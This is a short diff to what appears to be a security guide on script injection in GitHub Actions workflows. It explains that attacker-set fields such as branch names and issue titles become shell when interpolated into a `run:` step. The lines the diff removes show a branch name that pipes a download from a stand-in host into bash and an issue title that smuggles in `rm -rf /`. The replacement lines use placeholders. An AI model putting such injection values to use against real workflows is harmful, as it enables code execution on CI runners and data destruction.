@@ -19,8 +19,8 @@ These can be set by anyone who can open an issue, PR, or comment:
 | `github.event.commits.*.author.email` / `.name` | Commit author |
 | `github.event.pages.*.page_name` | Wiki editor |
 
-A branch named `$(curl evil.sh|bash)` or an issue titled `a"; rm -rf / #` becomes shell when
-interpolated into a `run:` step.
+A branch named `$(<attacker-command>)` or an issue titled `"; <attacker-command> #` becomes shell
+when interpolated into a `run:` step.
 
 ## The Vulnerable Pattern
 
